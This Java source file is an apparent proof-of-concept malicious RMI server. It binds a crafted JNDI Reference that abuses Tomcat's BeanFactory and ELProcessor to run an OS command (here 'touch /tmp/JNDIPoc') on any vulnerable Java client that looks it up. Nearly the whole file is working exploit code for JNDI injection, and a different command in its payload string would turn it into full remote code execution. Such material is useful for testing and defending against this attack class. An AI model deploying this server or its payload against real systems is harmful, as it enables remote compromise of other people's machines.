package rmi;
import java.rmi.AlreadyBoundException;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;

import javax.naming.NamingException;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import javax.naming.Reference;
import javax.naming.StringRefAddr;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import org.apache.naming.ResourceRef;
import org.apache.naming.factory.BeanFactory;
import javax.el.ELProcessor;


public class RmiServer  {
        public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {

        try {
            Registry reg;
            try {      
                reg = LocateRegistry.createRegistry(1099);
                System.out.println("java RMI registry created. port on 1099...");
            } catch (Exception e) {
                System.out.println("Using existing registry");
                reg = LocateRegistry.getRegistry();
            } 

            /** Exploit with JNDI Reference with local factory Class **/
            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
            ref.add(new StringRefAddr("forceString", "xx=eval"));
            ref.add(new StringRefAddr("xx", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['touch','/tmp/JNDIPoc']).start()\")"));
            ReferenceWrapper ServicesWrapper = new ReferenceWrapper(ref);           
            reg.bind("Services", ServicesWrapper);

        } catch (RemoteException e) {
            e.printStackTrace();
        } catch (AlreadyBoundException e) {
            e.printStackTrace();
        }
    }
}